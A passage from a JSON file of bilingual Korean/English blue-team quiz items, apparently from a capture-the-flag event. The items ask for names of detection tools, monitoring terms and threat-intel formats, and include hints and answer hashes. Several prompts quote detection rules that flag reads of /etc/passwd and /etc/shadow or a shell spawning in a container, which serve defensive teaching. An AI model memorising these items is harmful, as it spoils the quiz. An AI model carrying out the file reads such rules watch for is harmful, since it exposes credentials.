        "On a device shipped with the fuses unburned the root of the chain is empty, and an image signed with your own key passes as genuine."
      ]
    }
  },
  {
    "id": "t0_siem",
    "tier": 0,
    "cat": "detection",
    "track": "blueteam",
    "points": 45,
    "ci": true,
    "hash": "5eabe06ffe1942a31cfba4b1f763e76775a81d957369e9e5a43752c5b89fc996",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "흩어진 기록을 한자리에",
      "en": "Every Record in One Place"
    },
    "prompt": {
      "ko": "방화벽·서버·단말이 저마다 따로 남기는 기록을 한곳으로 끌어모아 형식을 맞추고, \"10분 안에 실패한 로그인 50번\" 같은 규칙으로 장비를 가로질러 사건을 엮어 경보를 올리는 관제의 중심 시스템이 있습니다. 네 글자 약어로 무엇이라 부를까요?",
      "en": "Firewalls, servers and endpoints each keep their own records. Which system pulls all of them into one place, puts them in a common shape, and raises an alarm when a rule like \"fifty failed logins in ten minutes\" matches across devices? Give the four-letter abbreviation."
    },
    "hints": {
      "ko": [
        "Security Information and Event Management 의 머리글자입니다.",
        "저장과 검색만 해 주는 기록 서버와 달리, 서로 다른 장비의 기록을 규칙으로 엮어 본다는 점이 핵심입니다."
      ],
      "en": [
        "The initials of Security Information and Event Management.",
        "Unlike a server that only stores and searches, the point here is tying records from different devices together with rules."
      ]
    }
  },
  {
    "id": "t0_soc",
    "tier": 0,
    "cat": "detection",
    "track": "blueteam",
    "points": 50,
    "ci": true,
    "hash": "7114d75b28f21587e37f4a299da0a9428684a8b72773b3087e8d6e63cfb4f312",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "불이 꺼지지 않는 방",
      "en": "The Room That Never Goes Dark"
    },
    "prompt": {
      "ko": "경보를 24시간 사람이 지켜보고 대응하는 조직, 그리고 그 사람들이 앉아 있는 관제실을 함께 가리키는 세 글자 약어는? 보통 1선이 첫 판단을, 2선이 깊은 분석을, 3선이 위협 사냥과 규칙 개선을 맡는 계층 구조로 운영됩니다.",
      "en": "Which three-letter abbreviation names both the team that watches alarms around the clock and the room they sit in? It is usually layered: tier 1 makes the first call, tier 2 digs deeper, and tier 3 hunts and improves the rules."
    },
    "hints": {
      "ko": [
        "Security Operations Center 의 머리글자입니다.",
        "조직이자 장소를 함께 부르는 말이라, \"우리 회사는 이것을 외부에 맡긴다\"처럼도 씁니다."
      ],
      "en": [
        "The initials of Security Operations Center.",
        "It names a team and a place at once, which is why companies say they \"outsource\" theirs."
      ]
    }
  },
  {
    "id": "t1_edr",
    "tier": 1,
    "cat": "detection",
    "track": "blueteam",
    "points": 60,
    "ci": true,
    "hash": "102e69f032cc2d62bb9db9160b549000dc2da76536fed635703d8d82d782e558",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "단말 위에 남는 눈",
      "en": "The Eye Left on the Endpoint"
    },
    "prompt": {
      "ko": "백신이 파일을 훑어 알려진 악성코드를 지우는 데서 멈춘다면, 이 종류의 제품은 단말에 상주하며 프로세스 생성·레지스트리 변경·네트워크 연결을 계속 기록해 두었다가, 나중에 \"이 프로세스의 부모가 무엇이었나\"를 거슬러 올라가 보게 해 주고 원격으로 프로세스를 죽이거나 단말을 망에서 떼어 놓기까지 합니다. 세 글자 약어는?",
      "en": "Antivirus scans files and removes what it already knows. This class of product instead lives on the machine and keeps recording process launches, registry writes and network connections, so that later you can walk back up and ask which process was the parent of which — and it can kill processes or cut the machine off the network remotely. Which three-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Endpoint Detection and Response 의 머리글자입니다.",
        "\"지웠다\"로 끝나지 않고 \"무엇이 무엇을 낳았는지\"를 나중에 되짚을 수 있다는 점이 이전 세대 제품과의 차이입니다."
      ],
      "en": [
        "The initials of Endpoint Detection and Response.",
        "The break from the older generation is that it does not stop at \"removed\" — you can reconstruct what spawned what, afterwards."
      ]
    }
  },
  {
    "id": "t1_syslog",
    "tier": 1,
    "cat": "detection",
    "track": "blueteam",
    "points": 60,
    "ci": true,
    "hash": "4d75f832ea2693e75fef081110af0c23a91d4d166a1ce1f63aa3d3d69cef9882",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "514번으로 흘러가는 줄",
      "en": "Lines Flowing to 514"
    },
    "prompt": {
      "ko": "유닉스 계열이 오래 써 온 기록 전달 규약입니다. 각 줄 앞에 설비(facility)와 심각도를 하나의 숫자로 눌러 담은 우선순위 값이 붙고, 기본적으로 UDP 514번 포트로 원격 수집 서버에 그대로 흘려보냅니다. RFC 5424 가 형식을 다시 정리했습니다. 이 규약의 이름은?",
      "en": "The long-standing Unix-family protocol for shipping records. Each line carries a priority value that packs a facility and a severity into one number, and by default the lines are pushed to a remote collector over UDP port 514. RFC 5424 restated its format. What is it called?"
    },
    "hints": {
      "ko": [
        "이름 자체가 \"시스템\"과 \"기록\"을 붙여 만든 합성어입니다.",
        "우선순위 값은 설비 번호에 8을 곱하고 심각도를 더해 만듭니다 — 그래서 한 숫자만 보고도 둘 다 복원할 수 있습니다."
      ],
      "en": [
        "The name itself is \"system\" and \"log\" fused together.",
        "The priority value is the facility times eight plus the severity, which is why one number recovers both."
      ]
    }
  },
  {
    "id": "t1_splunk",
    "tier": 1,
    "cat": "detection",
    "track": "blueteam",
    "points": 65,
    "ci": true,
    "hash": "101e21bef69a3df68f36ca31deb6616f10cc70e4bae8eed9ce83a9effb1fd5cb",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "파이프로 이어 붙이는 검색",
      "en": "Search Stitched with Pipes"
    },
    "prompt": {
      "ko": "기계가 쏟아내는 기록을 색인해 두고, 셸처럼 파이프(`|`)로 명령을 이어 붙이는 자체 검색 언어(SPL)로 뒤지는 상용 플랫폼입니다. 인덱싱한 하루 용량으로 값을 매기는 것으로도 유명합니다. 제품 이름은?",
      "en": "A commercial platform that indexes machine-generated records and queries them in its own search language (SPL), where you chain commands with a pipe (`|`) the way a shell does. It is equally famous for pricing by how many gigabytes a day you index. What is the product called?"
    },
    "hints": {
      "ko": [
        "검색 언어의 약어가 SPL 인 데서 이름을 짐작할 수 있습니다.",
        "동굴 탐험(spelunking)에서 따온 이름이라는 설명이 널리 알려져 있습니다."
      ],
      "en": [
        "The search language is abbreviated SPL, which points at the name.",
        "The name is widely explained as coming from spelunking — crawling through caves."
      ]
    }
  },
  {
    "id": "t1_triage",
    "tier": 1,
    "cat": "ir",
    "track": "blueteam",
    "points": 65,
    "ci": true,
    "hash": "0f916789d300a986c41cdb23c248926aaec1f73a9bbae0a7efae074f16480baf",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "전장에서 온 말",
      "en": "A Word from the Battlefield"
    },
    "prompt": {
      "ko": "경보가 하루에 수천 건 쏟아지면 전부 깊이 파 볼 수는 없습니다. 그래서 1선은 각 경보를 짧게 훑어 \"즉시 대응\", \"지켜보기\", \"오탐으로 닫기\"로 갈라 놓습니다. 부상자를 치료 우선순위로 나누던 전장 의료에서 그대로 가져온 이 단계를 뭐라고 부를까요?",
      "en": "When thousands of alarms arrive in a day, there is no way to examine every one of them in depth. So the first tier gives each one a short look and sorts it into act now, keep watching, or close as a false alarm. Battlefield medicine sorted the wounded by treatment priority the same way and lent this step its name. What is it?"
    },
    "hints": {
      "ko": [
        "프랑스어에서 온 말로, 원래 뜻은 \"골라내기\"입니다.",
        "나폴레옹 전쟁기의 야전 의무에서 유래했다고 알려져 있습니다."
      ],
      "en": [
        "It comes from French, where it plainly means \"sorting\".",
        "It is usually traced to field medicine in the Napoleonic wars."
      ]
    }
  },
  {
    "id": "t1_playbook",
    "tier": 1,
    "cat": "ir",
    "track": "blueteam",
    "points": 70,
    "ci": true,
    "hash": "2f2cc2a2b7df8544cefb9b1816b341156fe25406b873d5f7ea3db6a02c2bf8bb",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "새벽 세 시에 펼치는 것",
      "en": "What You Open at Three in the Morning"
    },
    "prompt": {
      "ko": "\"랜섬웨어 의심 시: ① 해당 단말을 망에서 분리 ② 메모리와 디스크 확보 ③ 법무·홍보에 통보 ④ 백업 무결성 확인\" 처럼, 특정 사건 유형에 대해 누가 무엇을 어떤 순서로 하는지 미리 적어 둔 문서를 뭐라고 부를까요? 미식축구에서 작전을 그려 두는 책자에서 온 말입니다.",
      "en": "\"On suspected ransomware: (1) pull the machine off the network, (2) capture memory and disk, (3) notify legal and comms, (4) check that backups are intact.\" What do you call a document that spells out, in advance, who does what in which order for one type of incident? The word comes from the book of plays a football team drills from."
    },
    "hints": {
      "ko": [
        "운동 경기에서 미리 짜 둔 작전을 모아 놓은 책을 가리키는 말입니다.",
        "자동화 도구가 이것을 그대로 실행하도록 만들어 두기도 합니다 — 사람이 읽는 절차서와 기계가 읽는 절차가 같은 이름을 씁니다."
      ],
      "en": [
        "In sport it is the book of set plays a team rehearses.",
        "Automation tools are often built to execute one directly, so the human procedure and the machine procedure share the name."
      ]
    }
  },
  {
    "id": "t1_snort",
    "tier": 1,
    "cat": "detection",
    "track": "blueteam",
    "points": 70,
    "ci": true,
    "hash": "d774e032616fb5d8b7d8ca50dbbcc39c83c490085fcdf707cc91aa86dcc0e8bd",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "돼지가 지키는 관문",
      "en": "The Pig at the Gate"
    },
    "prompt": {
      "ko": "1998년에 나와 오랫동안 사실상 표준이었던 오픈소스 네트워크 침입 탐지 도구입니다. `alert tcp any any -> $HOME_NET 80 (content:\"/etc/passwd\"; sid:1000001;)` 같은 한 줄짜리 규칙 문법으로 유명하고, 마스코트는 돼지입니다. 이름은?",
      "en": "The open-source network intrusion detection tool that appeared in 1998 and was the de facto standard for years. It is known for one-line rules such as `alert tcp any any -> $HOME_NET 80 (content:\"/etc/passwd\"; sid:1000001;)`, and its mascot is a pig. What is it called?"
    },
    "hints": {
      "ko": [
        "돼지가 코로 내는 소리를 뜻하는 영어 단어입니다.",
        "같은 규칙 문법을 이어받아 멀티스레드로 다시 쓴 후발 주자가 따로 있습니다."
      ],
      "en": [
        "It is the English word for the noise a pig makes through its nose.",
        "A later project inherited the same rule syntax and rewrote the engine to be multi-threaded."
      ]
    }
  },
  {
    "id": "t2_sigma",
    "tier": 2,
    "cat": "detection",
    "track": "blueteam",
    "points": 80,
    "ci": true,
    "hash": "38de90475bb334fb3dea5d54f250500aba60fe2c6158115d342b06bcb46e39bf",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "어느 플랫폼에나 붙는 규칙",
      "en": "A Rule That Fits Any Platform"
    },
    "prompt": {
      "ko": "탐지 규칙을 특정 제품의 질의 문법이 아니라 YAML 로 적어 두는 공개 형식입니다. `logsource:` 로 어떤 기록인지 밝히고, `detection:` 아래에 찾을 항목을 나열한 뒤 `condition:` 으로 그것들을 조합합니다. 그렇게 한 번 적어 두면 변환기가 각 관제 플랫폼의 질의문으로 바꿔 주기 때문에, 규칙을 제품에 묶이지 않게 나눌 수 있습니다. 이 형식의 이름은?",
      "en": "A public format for writing detection rules in YAML instead of one product query dialect. `logsource:` states which records it applies to, the items to look for are listed under `detection:`, and `condition:` combines them. Written once, a converter turns it into the query language of each monitoring platform, so rules can be shared without being tied to a vendor. What is the format called?"
    },
    "hints": {
      "ko": [
        "그리스 문자에서 이름을 따왔습니다 — 수학에서 합을 나타낼 때 쓰는 그 대문자입니다.",
        "네트워크 규칙과 파일 패턴에는 이미 공용 형식이 있었지만 기록 쪽에는 없었고, 그 빈자리를 메우려고 만들어졌습니다."
      ],
      "en": [
        "It is named after a Greek letter — the capital one mathematics uses for a sum.",
        "Network rules and file patterns already had shared formats; records did not, and this was written to fill that hole."
      ]
    }
  },
  {
    "id": "t2_sysmon",
    "tier": 2,
    "cat": "detection",
    "track": "blueteam",
    "points": 85,
    "ci": true,
    "hash": "bfadbf0d062a931111578f8c18867067a39ea1664998d680db92903e8fe28a52",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "윈도우가 기본으로는 안 남기는 것",
      "en": "What Windows Will Not Record on Its Own"
    },
    "prompt": {
      "ko": "Sysinternals 가 내놓은 무료 도구로, 드라이버와 서비스로 설치되어 윈도우 기본 감사보다 훨씬 촘촘한 기록을 전용 채널에 남깁니다. 이벤트 1번은 프로세스 생성(명령줄과 부모까지), 3번은 네트워크 연결, 11번은 파일 생성, 22번은 DNS 질의입니다. 무엇을 남길지는 XML 설정으로 좁혀야 하고, 그러지 않으면 금세 잡음에 파묻힙니다. 이 도구의 이름은?",
      "en": "A free Sysinternals tool that installs as a driver and a service and writes far denser records than the built-in Windows auditing, into a channel of its own. Event 1 is process creation, with command line and parent; 3 is a network connection; 11 is a file being written; 22 is a DNS query. What it records has to be narrowed with an XML configuration, or the volume buries you. What is the tool called?"
    },
    "hints": {
      "ko": [
        "\"시스템\"과 \"감시\"를 줄여 붙인 이름입니다.",
        "공개된 설정 파일들이 널리 쓰이는데, 무엇을 남기느냐보다 무엇을 빼느냐가 설정의 대부분입니다."
      ],
      "en": [
        "The name is \"system\" and \"monitor\", both cut short.",
        "Community configurations are widely reused, and most of their content is exclusions rather than inclusions."
      ]
    }
  },
  {
    "id": "t2_suricata",
    "tier": 2,
    "cat": "detection",
    "track": "blueteam",
    "points": 85,
    "ci": true,
    "hash": "c2f3826a1cb8c3c29eba0d1fd23d55898da013f1057fc9e4116e83fbc790ef89",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "여러 코어로 흩어 보는 눈",
      "en": "Eyes Spread Across Cores"
    },
    "prompt": {
      "ko": "2009년에 나온 오픈소스 침입 탐지·차단 엔진입니다. 앞 세대의 한 줄짜리 규칙 문법을 그대로 받아들이면서 처음부터 여러 스레드로 돌도록 다시 썼고, 포트가 아니라 실제 오간 내용을 보고 프로토콜을 판별하며, 흐르는 트래픽에서 파일을 통째로 떼어내 해시까지 남깁니다. 결과는 EVE 라는 JSON 형식으로 쏟아집니다. 마스코트는 미어캣입니다. 이름은?",
      "en": "An open-source intrusion detection and prevention engine from 2009. It accepts the previous generation one-line rule syntax while being rewritten from the start to run across threads, identifies protocols from what actually passes rather than from the port, and carves whole files out of live traffic, hashing them as it goes. Its output pours into a JSON format called EVE. Its mascot is a meerkat. What is it called?"
    },
    "hints": {
      "ko": [
        "마스코트인 미어캣의 학명이 그대로 이름입니다.",
        "OISF 라는 재단이 관리합니다."
      ],
      "en": [
        "The scientific name of the meerkat on its logo is the name.",
        "It is maintained by a foundation called OISF."
      ]
    }
  },
  {
    "id": "t2_zeek",
    "tier": 2,
    "cat": "detection",
    "track": "blueteam",
    "points": 90,
    "ci": true,
    "hash": "6e349f5b2a04d4f0c538ea1e8dd8a95067fd2c32f150a152816f14dcfdae0364",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "경보 대신 기록을 남기는 감시자",
      "en": "A Watcher That Files Records, Not Alarms"
    },
    "prompt": {
      "ko": "네트워크를 지켜보되 \"공격이다\"라고 소리치는 대신, 오간 것을 종류별 기록으로 정리해 놓는 도구입니다. `conn.log`·`dns.log`·`http.log`·`ssl.log` 처럼 프로토콜마다 파일이 생기고, 자체 스크립트 언어로 원하는 판단을 얹을 수 있습니다. 1990년대 로렌스 버클리 연구소에서 시작해 2018년에 이름을 바꿨는데, 그전 이름은 형제를 뜻하는 세 글자 단어였습니다. 지금 이름은?",
      "en": "A tool that watches a network but, instead of shouting that something is an attack, files what passed as records sorted by kind: `conn.log`, `dns.log`, `http.log`, `ssl.log`, one per protocol, with its own scripting language for layering judgements on top. It began at Lawrence Berkeley in the 1990s and was renamed in 2018; the old name was a three-letter word for a brother. What is it called now?"
    },
    "hints": {
      "ko": [
        "네 글자이고, 옛 이름이 조지 오웰의 『1984』에서 온 데 비해 새 이름은 특별한 뜻이 없는 짧은 말입니다.",
        "경보를 주는 물건이 아니라, 나중에 질문을 던질 수 있도록 사실을 쌓아 두는 물건입니다."
      ],
      "en": [
        "Four letters; where the old name came from Orwell, the new one is a short word with no particular meaning.",
        "It is not an alarm — it is a pile of facts you can ask questions of afterwards."
      ]
    }
  },
  {
    "id": "t2_auditd",
    "tier": 2,
    "cat": "detection",
    "track": "blueteam",
    "points": 90,
    "ci": true,
    "hash": "73780c7df3bcc07d77d28b76dbdb9ac698cbd2d1671aff6548a3983fcf40b5a2",
    "fmt": "서비스 이름 / service name",
    "title": {
      "ko": "커널이 부르면 받아 적는 데몬",
      "en": "The Daemon the Kernel Dictates To"
    },
    "prompt": {
      "ko": "리눅스 커널의 감사 하위 시스템이 내보내는 사건을 받아 `/var/log/audit/` 아래에 쌓는 사용자 공간 데몬입니다. `-a always,exit -F arch=b64 -S execve -k exec` 같은 규칙을 걸면 실행된 모든 프로그램을 잡을 수 있고, `-w /etc/passwd -p wa` 처럼 파일에 감시를 걸 수도 있습니다. 쌓인 것은 `ausearch` 와 `aureport` 로 뒤집니다. 이 데몬의 이름은?",
      "en": "The user-space daemon that receives events emitted by the Linux kernel audit subsystem and files them under `/var/log/audit/`. A rule such as `-a always,exit -F arch=b64 -S execve -k exec` catches every program that runs, and `-w /etc/passwd -p wa` puts a watch on a file. What piles up is searched with `ausearch` and `aureport`. What is the daemon called?"
    },
    "hints": {
      "ko": [
        "이름은 \"감사\"라는 영어 낱말에 데몬을 뜻하는 글자 하나를 붙인 여섯 글자입니다.",
        "규칙은 `auditctl` 로 즉시 걸고, 재부팅 뒤에도 남기려면 규칙 파일에 적어 둡니다."
      ],
      "en": [
        "Six letters: the English word for an audit plus the single letter that marks a daemon.",
        "Rules go in live with `auditctl`; to survive a reboot they belong in the rules file."
      ]
    }
  },
  {
    "id": "t2_elk",
    "tier": 2,
    "cat": "detection",
    "track": "blueteam",
    "points": 90,
    "ci": true,
    "hash": "2f60f61a34244180b562a206de450c7419e3b3cfa274c7903ba888f3bc0ebc11",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "세 제품의 머리글자",
      "en": "Three Products, Three Letters"
    },
    "prompt": {
      "ko": "기록을 다루는 오픈소스 조합을 부르던 세 글자 이름입니다. 색인과 검색을 맡는 저장소, 들어오는 줄을 잘라 필드로 만드는 수집·가공기, 그리고 그것을 그래프와 대시보드로 보여 주는 화면 — 이 세 제품의 머리글자를 그대로 붙였습니다. 나중에 가벼운 전송기 묶음이 합류하면서 회사는 이 이름 대신 \"Elastic Stack\" 을 밀었지만 현장에서는 여전히 이 세 글자로 부릅니다. 무엇일까요?",
      "en": "The three-letter name for the open-source combination people used to work with records: the store that indexes and searches, the collector that cuts incoming lines into fields, and the screen that turns them into graphs and dashboards — the initials of those three products, in order. After a family of lightweight shippers joined, the company pushed \"Elastic Stack\" instead, but the field still says these three letters. What are they?"
    },
    "hints": {
      "ko": [
        "공교롭게도 큰 사슴을 뜻하는 영어 낱말과 철자가 같습니다.",
        "가운데 글자가 가공기, 마지막 글자가 화면입니다."
      ],
      "en": [
        "The three letters happen to spell the English word for a large deer.",
        "The middle letter is the collector; the last one is the screen."
      ]
    }
  },
  {
    "id": "t2_quarantine",
    "tier": 2,
    "cat": "ir",
    "track": "blueteam",
    "points": 100,
    "ci": true,
    "hash": "c2d66755e6d0b42f7a54187c020f4c80f779620a057c070c779007da6b851f5d",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "지우지 않고 가두기",
      "en": "Not Deleted, Held"
    },
    "prompt": {
      "ko": "악성으로 판정된 파일을 백신이 곧바로 지워 버리면 오탐일 때 되돌릴 수 없고 분석할 검체도 사라집니다. 그래서 대개는 원래 자리에서 들어내 실행되지 않도록 부호를 뒤집거나 암호화해 전용 보관소에 옮겨 두고, 필요하면 원상복구하거나 꺼내어 분석합니다. 이 조치를 뭐라고 부를까요? 이름은 항구에서 배를 40일 붙잡아 두던 관행에서 왔습니다.",
      "en": "If antivirus simply deletes a file it judged malicious, a false alarm cannot be undone and the specimen to analyse is gone. So the usual move is to lift it out of its place, encode or encrypt it so it cannot run, and hold it in a store of its own, from which it can be restored or fetched for analysis. What is that called? The name comes from holding ships at port for forty days."
    },
    "hints": {
      "ko": [
        "이탈리아어로 40 을 뜻하는 말에서 왔습니다.",
        "흑사병 시절 베네치아의 항구 관행이 어원입니다."
      ],
      "en": [
        "It comes from the Italian word for forty.",
        "The origin is a Venetian harbour practice from the time of the plague."
      ]
    }
  },
  {
    "id": "t2_osint",
    "tier": 2,
    "cat": "intel",
    "track": "blueteam",
    "points": 100,
    "ci": true,
    "hash": "607b00503c7e5203980e2f657b7493e52faaf49c99c42ec541f3b36ee1bd67da",
    "fmt": "약어 / acronym (5글자 / 5 chars)",
    "title": {
      "ko": "아무도 훔치지 않은 정보",
      "en": "Intelligence Nobody Stole"
    },
    "prompt": {
      "ko": "등기부·채용공고·인증서 투명성 로그·깃허브 커밋 기록·직원의 사회관계망 게시물처럼, 누구나 합법적으로 볼 수 있는 자료만 모아 엮어 만드는 정보를 다섯 글자 약어로 뭐라고 부를까요? 침투를 준비하는 쪽도, 자기 조직이 밖에서 어떻게 보이는지 점검하는 쪽도 같은 것을 씁니다.",
      "en": "Registries, job postings, certificate transparency logs, commit histories, what staff post on social networks — intelligence built only from material anyone may lawfully look at. Which five-letter abbreviation names it? The side preparing an intrusion and the side checking how its own organisation looks from outside both work from it."
    },
    "hints": {
      "ko": [
        "Open Source 로 시작하는 네 낱말의 머리글자입니다 — 여기서 \"오픈 소스\"는 소프트웨어 라이선스와는 상관없는 말입니다.",
        "자료를 모으는 행위 자체는 표적에게 아무 흔적도 남기지 않는 경우가 많습니다."
      ],
      "en": [
        "The initials of four words beginning with Open Source — where \"open source\" has nothing to do with software licensing.",
        "Gathering it often leaves no trace at all on the target."
      ]
    }
  },
  {
    "id": "t3_stix",
    "tier": 3,
    "cat": "intel",
    "track": "blueteam",
    "points": 105,
    "ci": true,
    "hash": "78eaa0fed572067109de696c405b5eb4e3882914d4d4e57e8df7133c98910f32",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "위협을 문법에 담다",
      "en": "Threats With a Grammar"
    },
    "prompt": {
      "ko": "\"저 주소는 나쁘다\"를 사람이 읽는 보고서 대신 기계가 읽는 객체로 적는 공개 표현 형식입니다. `indicator`·`malware`·`threat-actor`·`campaign` 같은 객체를 JSON 으로 쓰고, 그 사이를 `uses`·`attributed-to` 같은 관계 객체로 이어 그래프를 만듭니다. 네 글자 약어로 무엇일까요?",
      "en": "A public representation format that writes \"that address is bad\" as machine-readable objects instead of a report a human reads. Objects such as `indicator`, `malware`, `threat-actor` and `campaign` are written in JSON, and relationship objects such as `uses` and `attributed-to` join them into a graph. Which four-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Structured Threat Information eXpression 의 머리글자입니다.",
        "무엇을 담을지를 정하는 표현 형식일 뿐이고, 그것을 실어 나르는 통신 규약은 짝을 이루는 다른 이름으로 따로 있습니다."
      ],
      "en": [
        "The initials of Structured Threat Information eXpression.",
        "It only settles what is written down; the protocol that carries it across the wire is a separate, companion name."
      ]
    }
  },
  {
    "id": "t3_taxii",
    "tier": 3,
    "cat": "intel",
    "track": "blueteam",
    "points": 110,
    "ci": true,
    "hash": "9416921b0171a04c5329b657841f40cdfce07beed8f4131846fd1161a1806e3d",
    "fmt": "약어 / acronym (5글자 / 5 chars)",
    "title": {
      "ko": "실어 나르는 쪽",
      "en": "The Half That Carries It"
    },
    "prompt": {
      "ko": "위협 정보를 어떤 모양으로 적을지가 정해졌다면 이제 그것을 주고받을 통로가 필요합니다. HTTPS 위에서 도는 이 규약은 서버가 `/taxii2/` 아래에 API 루트를 두고, 받는 쪽이 주기적으로 끌어가는 컬렉션과 밀어 주는 채널을 제공합니다. 다섯 글자 약어로 무엇이라 부를까요?",
      "en": "Once the shape of threat information is settled, there still has to be a way to move it. This protocol runs over HTTPS: a server exposes API roots under `/taxii2/`, offering collections that consumers poll and channels that push to them. Which five-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Trusted Automated eXchange of Intelligence Information 의 머리글자입니다.",
        "내용의 문법이 아니라 배달을 맡는 쪽이라, 서로 다른 진영이 같은 통로로 다른 형식을 실어 보내기도 합니다."
      ],
      "en": [
        "The initials of Trusted Automated eXchange of Intelligence Information.",
        "It handles delivery rather than the grammar of the content, so different camps sometimes ship different formats down the same pipe."
      ]
    }
  },
  {
    "id": "t3_misp",
    "tier": 3,
    "cat": "intel",
    "track": "blueteam",
    "points": 110,
    "ci": true,
    "hash": "a22d818435177efd8bcb8b3b00514ba5814aa0c44599df4faa549cac3f8e2a11",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "같이 보는 사건 장부",
      "en": "A Ledger Everyone Reads"
    },
    "prompt": {
      "ko": "여러 조직이 각자 관찰한 것을 올려놓고 나눠 보는 오픈소스 공유 플랫폼입니다. 하나의 침해를 `event` 로 세우고 그 아래에 주소·해시·도메인을 `attribute` 로 달며, 어디까지 퍼뜨릴지는 초록·주황·빨강으로 표시하는 신호등 규약으로 정합니다. 다른 조직의 서버를 그대로 동기화해 끌어올 수도 있습니다. 네 글자 약어로 무엇일까요?",
      "en": "An open-source sharing platform where several organisations post what each of them observed. One intrusion becomes an `event`, with addresses, hashes and domains hung under it as `attribute` records, and how far it may travel is set with the green/amber/red traffic-light convention. A server can also synchronise wholesale from another organisation's. Which four-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Malware Information Sharing Platform 의 머리글자입니다 — 이름이 붙던 시절보다 지금은 훨씬 넓은 것을 담습니다.",
        "신호등 표시를 잘못 달면 원래 조직 안에서만 돌아야 할 것이 연합 전체로 퍼집니다."
      ],
      "en": [
        "The initials of Malware Information Sharing Platform — it now holds far more than the name from its early days suggests.",
        "Mislabel the traffic light and something meant to stay inside one organisation travels to the whole federation."
      ]
    }
  },
  {
    "id": "t3_cti",
    "tier": 3,
    "cat": "intel",
    "track": "blueteam",
    "points": 115,
    "ci": true,
    "hash": "4893825586217838d936b0d6c498f8427fe26f8aaad834ab6a042909b39d2098",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "자료가 아니라 판단",
      "en": "Not Data, a Judgement"
    },
    "prompt": {
      "ko": "수집한 자료 더미가 아니라, 그것을 특정 조직의 처지에 비추어 분석해 \"우리가 무엇을 해야 하는가\"까지 답해 주는 결과물을 가리키는 분야의 세 글자 약어는? 경영진을 향한 전략 수준, 공격 집단의 행동 방식을 다루는 작전 수준, 곧바로 탐지에 넣을 수 있는 전술 수준으로 나누어 이야기합니다.",
      "en": "Not a pile of collected data, but the product of analysing it against one organisation's situation until it answers \"what should we do\". Which three-letter abbreviation names that discipline? It is usually split into a strategic level aimed at executives, an operational level about how an adversary behaves, and a tactical level that can be fed straight into detection."
    },
    "hints": {
      "ko": [
        "Cyber Threat Intelligence 의 머리글자입니다.",
        "받는 사람이 그것을 읽고 무언가를 바꾸지 않는다면, 아무리 정확해도 이 이름을 붙일 수 없다고들 말합니다."
      ],
      "en": [
        "The initials of Cyber Threat Intelligence.",
        "The saying is that if the recipient changes nothing after reading it, however accurate it was, it does not earn this name."
      ]
    }
  },
  {
    "id": "t3_ttp",
    "tier": 3,
    "cat": "intel",
    "track": "blueteam",
    "points": 120,
    "ci": true,
    "hash": "9e0a25b467849e5c166fa6be70197cc6fb83937f8970bc45cb153460f72c00c5",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "바꾸기 가장 힘든 것",
      "en": "The Hardest Thing to Change"
    },
    "prompt": {
      "ko": "주소 하나는 오늘 바꾸면 그만이고 파일 하나는 한 바이트만 고쳐도 해시가 달라지지만, 공격자가 몸에 익힌 일하는 방식은 그렇게 쉽게 갈아치우지 못합니다. 무엇을 노리는가·어떤 수법으로 하는가·손에 익은 순서가 어떠한가를 묶어 부르는 세 글자 약어는? MITRE ATT&CK 은 바로 이 층위를 격자에 정리한 것입니다.",
      "en": "An address can be swapped out today and one changed byte gives a file a new hash, but the way an adversary has learned to work is not replaced so cheaply. Which three-letter abbreviation covers what they aim at, by what method, and in what practised order? MITRE ATT&CK is a grid built at exactly this layer."
    },
    "hints": {
      "ko": [
        "전술·기법·절차, 세 낱말의 머리글자입니다.",
        "고통의 피라미드에서 맨 위에 놓입니다 — 여기를 막히면 공격자는 도구를 바꾸는 정도가 아니라 일하는 법을 다시 배워야 합니다."
      ],
      "en": [
        "The initials of tactics, techniques and procedures.",
        "It sits at the top of the pyramid of pain: blocked here, an adversary has to relearn how they work rather than merely swap a tool."
      ]
    }
  },
  {
    "id": "t3_falco",
    "tier": 3,
    "cat": "detection",
    "track": "blueteam",
    "points": 120,
    "ci": true,
    "hash": "f5bed22b9f4bed888f77f06c03a5d6aaef691682aa2820f6158919427f905194",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "컨테이너 안에서 일어난 일",
      "en": "What Happened Inside the Container"
    },
    "prompt": {
      "ko": "커널에서 시스템 호출을 eBPF 로 지켜보다가 YAML 규칙에 걸리면 경보를 올리는 CNCF 런타임 보안 도구입니다. `condition: container.id != host and proc.name = bash` 처럼 컨테이너 안에서 셸이 뜨거나 `/etc/shadow` 가 열리는 순간을 잡아냅니다. 이름은?",
      "en": "A CNCF runtime security tool that watches system calls from the kernel with eBPF and raises an alarm when a YAML rule matches. Conditions like `condition: container.id != host and proc.name = bash` catch the moment a shell appears inside a container or `/etc/shadow` is opened. What is it called?"
    },
    "hints": {
      "ko": [
        "이탈리아어로 매를 뜻하는 낱말이고, 만든 회사 이름도 같은 새에서 왔습니다.",
        "막지 않고 알리기만 하는 것이 기본이라, 차단은 별도의 대응 장치에 넘겨야 합니다."
      ],
      "en": [
        "The Italian word for a falcon; the company that built it took its name from the same bird.",
        "By default it only tells you, it does not stop anything — blocking has to be handed to a separate response component."
      ]
    }
  },
  {
    "id": "t3_etw",
    "tier": 3,
